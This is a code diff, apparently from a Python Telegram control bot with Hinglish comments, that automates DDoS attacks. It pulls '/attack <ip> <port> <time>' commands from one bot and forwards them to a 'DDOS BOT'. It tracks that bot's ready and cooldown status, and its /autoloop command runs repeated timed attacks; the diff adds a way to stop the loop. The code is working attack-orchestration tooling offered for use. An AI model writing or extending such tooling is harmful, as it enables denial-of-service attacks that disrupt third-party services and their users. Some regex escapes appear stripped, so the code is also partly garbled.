@@ -20,35 +20,29 @@ tele = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)
 # state
 chat_targets: dict[int, str] = {}
 chat_counts: dict[int, int] = {}
-loop_tasks: dict[int, asyncio.Task] = {}
 ip_waiters: dict[int, asyncio.Future] = {}
 bot_b_status = "UNKNOWN"
+auto_running: dict[int, bool] = {}   # <-- naya flag per chat
 
 
 # ---------- LISTENERS ----------
 @tele.on(events.NewMessage(from_users=BOT_A))
 async def ip_bot_listener(event):
-    """
-    IP BOT ka reply listen karo, CMD line clean karke pending chats ko do.
-    """
     text = event.text or ""
     print("📩 IP BOT REPLY:", repr(text))
 
-    # 'CMD:' wali line nikaalo
     m_line = re.search(r"CMD:s*(.+)", text)
     if not m_line:
         return
 
     line = m_line.group(1).strip()
 
-    # Backticks ke andar ka part, agar ho to
     m_cmd = re.search(r"`([^`]+)`", line)
     if m_cmd:
         raw_cmd = m_cmd.group(1).strip()
     else:
         raw_cmd = line.lstrip("* ").strip()
 
-    # Sirf /attack <ip> <port> <time> command nikaalo
     m_attack = re.search(r"(/attacks+S+s+S+s+S+)", raw_cmd)
     if m_attack:
         final_cmd = m_attack.group(1).strip()
@@ -65,23 +59,17 @@ async def ip_bot_listener(event):
 
 @tele.on(events.NewMessage(from_users=BOT_B))
 async def bot_b_listener(event):
-    """
-    DDOS BOT ke /status / attack / cooldown messages se status set karo.
-    """
     global bot_b_status
     text = event.text or ""
     low = text.lower()
     print("DDOS BOT MSG:", repr(text))
 
-    # READY patterns
     if (
         "✅ **ʀᴇᴀᴅʏ**" in text
         or "no attack running" in low
         or "you can start a new attack" in low
     ):
         bot_b_status = "READY"
-
-    # RUNNING patterns
     elif (
         "attack started" in low
         or "ᴀᴛᴛᴀᴄᴋ sᴛᴀʀᴛᴇᴅ" in text
@@ -91,24 +79,14 @@ async def bot_b_listener(event):
         or "ᴀᴛᴛᴀᴄᴋ ʀᴜɴɴɪɴɢ" in text
     ):
         bot_b_status = "RUNNING"
-
-    # COOLDOWN patterns
     elif "cooldown" in low or "⏳" in text:
         bot_b_status = "COOLDOWN"
-
     else:
-        # ignore
         pass
 
 
-# ---------- SINGLE ROUND (1 attack) ----------
+# ---------- SINGLE ROUND ----------
 async def single_round(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
-    """
-    Ek round:
-    - IP BOT se CMD lo
-    - DDOS BOT ko attack command bhejo
-    """
-
     target = chat_targets.get(chat_id)
     if not target:
         await context.bot.send_message(
@@ -141,45 +119,69 @@ async def single_round(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
 
     await context.bot.send_message(
         chat_id,
-        f"📥 CMD from IP BOT:`{final_cmd}`",
+        f"📥 CMD from IP BOT:
+`{final_cmd}`",
         parse_mode="Markdown",
     )
 
-    # Direct attack bhej do (DDOS bot ka cooldown tum delay se handle karoge)
     await tele.send_message(BOT_B, final_cmd)
     await context.bot.send_message(
         chat_id,
-        f"🚀 Sent to DDOS BOT:`{final_cmd}`",
+        f"🚀 Sent to DDOS BOT:
+`{final_cmd}`",
         parse_mode="Markdown",
     )
 
 
-# ---------- AUTO LOOP ----------
+# ---------- AUTO LOOP (stop-able) ----------
 async def autoloop(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """
-    /autoloop
-    -> setcount ke hisaab se multiple single_round run karega
-    -> har attack ke beech fixed delay
-    """
     chat_id = update.effective_chat.id
     count = chat_counts.get(chat_id, 1)
-    delay = 45  # seconds: 30s attack + 10–15s cooldown buffer
+    delay = 45  # seconds
+
+    # Agar already running hai to dobara start na ho
+    if auto_running.get(chat_id):
+        await update.message.reply_text("⚠️ Auto loop already running in this chat.")
+        return
+
+    auto_running[chat_id] = True
 
     await update.message.reply_text(
-        f"🔁 Auto loop starting.Attacks: {count}Delay: {delay}s between each."
+        f"🔁 Auto loop starting.
+Attacks: {count}
+Delay: {delay}s between each."
     )
 
     for i in range(count):
+        # Har round se pehle check karo flag off to nahi hua
+        if not auto_running.get(chat_id):
+            await update.message.reply_text("🛑 Auto loop stopped.")
+            break
+
         await update.message.reply_text(f"▶️ Attack {i + 1}/{count} starting…")
         await single_round(chat_id, context)
 
         if i != count - 1:
+            if not auto_running.get(chat_id):
+                await update.message.reply_text("🛑 Auto loop stopped.")
+                break
             await update.message.reply_text(
                 f"⏳ Waiting {delay}s before next attack…"
             )
-            await asyncio.sleep(delay)
+            # Delay ke beech bhi thoda‑thoda check
+            for _ in range(delay):
+                if not auto_running.get(chat_id):
+                    await update.message.reply_text("🛑 Auto loop stopped during delay.")
+                    break
+                await asyncio.sleep(1)
+            if not auto_running.get(chat_id):
+                break
 
-    await update.message.reply_text("✅ Auto loop finished.")
+    auto_running[chat_id] = False
+    if auto_running.get(chat_id) is False:
+        await update.message.reply_text("✅ Auto loop finished.")
+
+
 # ---------- START COMMAND ----------
 async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = """
@@ -190,9 +192,10 @@ Available commands:
 /setcount <number_of_attacks>  - Attacks ka count set karo
 /startloop                     - Ek single attack round
 /autoloop                      - setcount ke hisaab se auto attacks
-/stoploop                      - Auto loop info
+/stoploop                      - Auto loop ko beech me stop karo
 """
     await update.message.reply_text(text.strip())
+
 
 # ---------- PTB COMMANDS ----------
 async def setlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -213,14 +216,16 @@ async def setcount(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def startloop(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """
-    Optional: sirf ek single_round run kare.
-    """
     await single_round(update.effective_chat.id, context)
 
 
 async def stoploop(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("❌ No internal loop to stop in /autoloop mode.")
+    chat_id = update.effective_chat.id
+    if auto_running.get(chat_id):
+        auto_running[chat_id] = False
+        await update.message.reply_text("🛑 Stop signal sent. Waiting for current step to finish…")
+    else:
+        await update.message.reply_text("ℹ️ No auto loop running in this chat.")
 
 
 # ---------- MAIN ----------
@@ -235,7 +240,7 @@ async def main():
     app.add_handler(CommandHandler("startloop", startloop))
     app.add_handler(CommandHandler("autoloop", autoloop))
     app.add_handler(CommandHandler("stoploop", stoploop))
-    
+
     print("🤖 Control bot running")
     await app.initialize()
     await app.start()
